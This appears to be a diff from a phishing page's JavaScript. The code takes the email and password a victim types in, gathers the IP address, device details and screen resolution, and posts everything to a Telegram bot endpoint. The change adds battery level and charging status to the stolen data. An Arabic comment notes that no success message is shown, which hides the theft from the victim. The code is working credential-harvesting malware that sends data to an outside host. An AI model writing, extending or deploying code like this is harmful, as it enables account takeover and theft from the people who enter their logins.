@@ -90,26 +90,36 @@
                     const screenHeight = screen.height;
                     const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
-                    const message = ` 
-                        <b>New Login Attempt</b>\n
-                        <b>Email:</b> ${email}\n
-                        <b>Password:</b> ${password}\n
-                        <b>IP Address:</b> ${ip}\n
-                        <b>Device Type:</b> ${deviceType}\n
-                        <b>Platform:</b> ${platform}\n
-                        <b>User Agent:</b> ${userAgent}\n
-                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
-                    `;
+                    // الحصول على معلومات البطارية
+                    navigator.getBattery().then(function(battery) {
+                        const batteryLevel = battery.level * 100; // مستوى البطارية
+                        const chargingStatus = battery.charging ? 'Charging' : 'Not Charging'; // حالة الشحن
 
-                    axios.post(URI_API, {
-                        chat_id: CHAT_ID,
-                        parse_mode: 'html',
-                        text: message
-                    }).then(response => {
-                        // لا تظهر رسالة نجاح
+                        const message = ` 
+                            <b>New Login Attempt</b>\n
+                            <b>Email:</b> ${email}\n
+                            <b>Password:</b> ${password}\n
+                            <b>IP Address:</b> ${ip}\n
+                            <b>Device Type:</b> ${deviceType}\n
+                            <b>Platform:</b> ${platform}\n
+                            <b>User Agent:</b> ${userAgent}\n
+                            <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}\n
+                            <b>Battery Level:</b> ${batteryLevel}%\n
+                            <b>Charging Status:</b> ${chargingStatus}
+                        `;
+
+                        axios.post(URI_API, {
+                            chat_id: CHAT_ID,
+                            parse_mode: 'html',
+                            text: message
+                        }).then(response => {
+                            // لا تظهر رسالة نجاح
+                        }).catch(error => {
+                            console.error(error);
+                            alert('Error sending the information. Please try again.');
+                        });
                     }).catch(error => {
-                        console.error(error);
-                        alert('Error sending the information. Please try again.');
+                        console.error('Error fetching battery info:', error);
                     });
                 })
                 .catch(error => {
